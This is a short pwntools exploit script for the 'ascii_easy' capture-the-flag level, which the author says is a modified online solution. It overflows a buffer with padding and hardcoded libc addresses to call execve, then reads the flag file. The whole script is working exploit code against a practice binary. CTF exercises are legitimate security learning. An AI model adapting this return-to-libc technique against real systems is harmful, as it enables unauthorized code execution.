# I hate this level, so close to solving it but this is online solution
# which I modified a little bit

from pwn import *

base_libc = 0x5555e000

call_execve = 0x000b876a
error = 0x159c56
null = 0x14060

payload = b"a" * 32
payload += p32(call_execve + base_libc)
payload += p32(error + base_libc)
payload += p32(null + base_libc) * 2

r = process(["/home/ascii_easy/ascii_easy", payload])
r.sendline("cat /home/ascii_easy/flag")

r.recv()
flag = r.recv().decode()

print("Flag is:", flag)